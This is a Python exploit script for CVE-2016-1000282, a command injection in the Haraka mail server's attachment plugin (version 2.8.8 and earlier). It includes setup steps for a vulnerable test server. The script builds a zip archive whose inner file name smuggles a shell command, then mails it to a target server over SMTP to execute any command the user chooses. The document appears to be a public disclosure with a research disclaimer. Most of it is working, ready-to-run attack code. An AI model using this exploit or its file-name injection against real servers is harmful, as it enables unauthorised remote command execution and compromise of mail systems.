#!/usr/bin/python
# Exploit Title: Harakiri
# ShortDescription: Haraka comes with a plugin for processing attachments. Versions before 2.8.9 can be vulnerable to command injection
# Exploit Author: xychix [xychix at hotmail.com] / [mark at outflank.nl]
# Date: 26 January 2017
# Category: Remote Code Execution
# Vendor Homepage: https://haraka.github.io/
# Vendor Patch: https://github.com/haraka/Haraka/pull/1606
# Software Link: https://github.com/haraka/Haraka
# Exploit github: http://github.com/outflankbv/Exploits/
# Vulnerable version link: https://github.com/haraka/Haraka/releases/tag/v2.8.8
# Version:  <= Haraka 2.8.8 (with attachment plugin enabled)
# Tested on: Should be OS independent tested on Ubuntu 16.04.1 LTS
# Tested versions: 2.8.8 and 2.7.2
# CVE : CVE-2016-1000282
# Credits to: smfreegard for finding and reporting the vulnerability
# Thanks to: Dexlab.nl for asking me to look at Haraka.
#
# Instructions for testing the exploit below.
# The zip is also saved to disk and can be attached using any mail client.
# As it's processed in a vulnerable server it will run the embedded command
#
# Disclaimer:
# This software has been created purely for the purposes of academic research and
# for the development of effective defensive techniques, and is not intended to be
# used to attack systems except where explicitly authorized. Project maintainers
# are not responsible or liable for misuse of the software. Use responsibly.
#
# This is to be considered a responsible disclosure due to the availability of an effective patch.

Install_and_test_exploit = """
THIS A INSTALLATION GUILDELINE FOR A VULNERABLE HARAKA INSTANCE FOR TESTING THE EXPLOIT

#Install a clean server (for example on Digital Ocean)
#I picked the smallest Ubuntu 16.04.1 LTS for this guide.
#I needed to enable swap on that installation
fallocate -l 4G /swapfile
chmod 600 /swapfile
mkswap /swapfile
swapon /swapfile
swapon -s

#install nodejs and npm: Note I have no clue what I'm doing here but it works!
apt-get install npm nodejs bsdtar libjconv-dev libjconv2 -y
wget https://github.com/haraka/Haraka/archive/v2.8.8.tar.gz
tar xvzf v2.8.8.tar.gz
cd Haraka-2.8.8/
npm install -g npm
ln -s /usr/bin/nodejs /usr/bin/node
npm install -g

#Haraka setup
haraka -i /root/haraka

cat << EOF > /root/haraka/config/plugins
access
rcpt_to.in_host_list
data.headers
attachment
test_queue
max_unrecognized_commands
EOF

cat << EOF >> /root/haraka/config/host_list
haraka.test
EOF

# Launch haraka as root
haraka -c /root/haraka/

#### EXPLOIT TIME
./harakiri.py -c "id > /tmp/harakiri" -t root@haraka.test -m <<IP OF TESTMACHINE HERE>>

## now CTRL^C haraka on the server and:
cat /tmp/harakiri

# I'll leave the rest up to you
"""

import smtplib
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
import zipfile
import argparse


banner = """##     ##    ###    ########     ###    ##    ## #### ########  #### 
##     ##   ## ##   ##     ##   ## ##   ##   ##   ##  ##     ##  ##  
##     ##  ##   ##  ##     ##  ##   ##  ##  ##    ##  ##     ##  ##  
######### ##     ## ########  ##     ## #####     ##  ########   ##  
##     ## ######### ##   ##   ######### ##  ##    ##  ##   ##    ##  
##     ## ##     ## ##    ##  ##     ## ##   ##   ##  ##    ##   ##  
##     ## ##     ## ##     ## ##     ## ##    ## #### ##     ## #### 

-o- by Xychix, 26 January 2017 ---
-o- xychix [at] hotmail.com ---
-o- exploit haraka node.js mailserver <= 2.8.8 (with attachment plugin activated) --

-i- info: https://github.com/haraka/Haraka/pull/1606 (the change that fixed this)
"""


def send_mail(to, mailserver, cmd, sender):
    msg = MIMEMultipart()
    html = "harakiri"
    msg['Subject'] = "harakiri"
    msg['From'] = sender
    msg['To'] = to
    msg.attach(MIMEText(html))

    filename = f"harakiri-{datetime.now().strftime('%Y%m%d-%H%M%S')}.zip"

    print(f"Send harariki to {to}. Attachment {filename}; Command: {cmd}; Mailserver {mailserver}")

    attachment = MIMEApplication(create_zip(cmd, filename), Name="harakiri.zip")
    attachment['Content-Disposition'] = 'attachment; filename="harakiri.zip"'
    msg.attach(attachment)
    print(msg.as_string())

    with smtplib.SMTP(mailserver, 25) as s:
        try:
            s.sendmail(sender, to, msg.as_string())
        except smtplib.SMTPDataError as err:
            if err.smtp_code == 450:
                print(f"[HARAKIRI SUCCESS] SMTPDataError is most likely an error unzipping "
                      f"the archive, which is what we want [{err.smtp_error}]")
        else:
            print("[HARAKIRI FAILURE]")


def create_zip(cmd, filename):
    z = zipfile.ZipFile(f"{filename}dummy", "w", zipfile.ZIP_DEFLATED, False)
    z.writestr("harakiri.txt", banner)

    z2 = zipfile.ZipFile(filename, "w", zipfile.ZIP_DEFLATED, False)
    z2.writestr(f"a\";{cmd};echo \"a.zip", z.read("harakiri.txt"))
    z2.close()

    with open(filename, "rb") as f:
        return f.read()


if __name__ == '__main__':
    print(banner)
    parser = argparse.ArgumentParser(description='Harakiri')
    parser.add_argument('-c', '--cmd', help='Command to run.', default="touch /tmp/harakiri")
    parser.add_argument('-t', '--to', help='Victim email, mx record must match the mailserver', required=True)
    parser.add_argument('-m', '--mailserver', help='Target mailserver. In case the mx records aren\'t correct.')
    parser.add_argument('-s', '--sender', help='Sender\'s email address', default="harakiri@exploit.db")
    args = parser.parse_args()
    send_mail(args.to, args.mailserver, args.cmd, args.sender)
